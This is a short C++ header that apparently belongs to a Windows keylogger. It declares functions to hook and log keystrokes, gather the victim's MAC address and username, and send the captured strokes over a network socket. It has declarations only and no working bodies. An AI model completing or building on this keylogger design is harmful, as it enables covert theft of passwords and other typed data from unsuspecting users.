#ifndef LOGGER_H
#define LOGGER_H

#include <iostream>
#include <ctime>   
#include <vector> 
#include <map>
#include <stdio.h>
#include <string.h> 
#include <Lmcons.h>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mstcpip.h>
#include <ws2ipdef.h>
#include <windows.h>


struct ClientInfo {
    char mac_addr[18];
    char current_time[30]; 
    char os_username[30]; 
};


//macros
#define KEYLOG_BUFFER_SIZE 40
#define DEBUG 1
#define MAX_LEN 128
#pragma comment(lib,"ws2_32.lib")

ClientInfo reapClient(); 
char* lower_string(char s[]); 
char* upper_string(char s[]);
void logStroke(char stroke[]);
bool sendStrokes(char packet[]);
__declspec(dllexport) LRESULT CALLBACK myhook(int code, WPARAM wp, LPARAM lp); 
void MsgLoop(); 
DWORD WINAPI StartLoggerInvoker(LPVOID lpParameter); 
void startLogger(); 
//bool StopLogger();


#endif
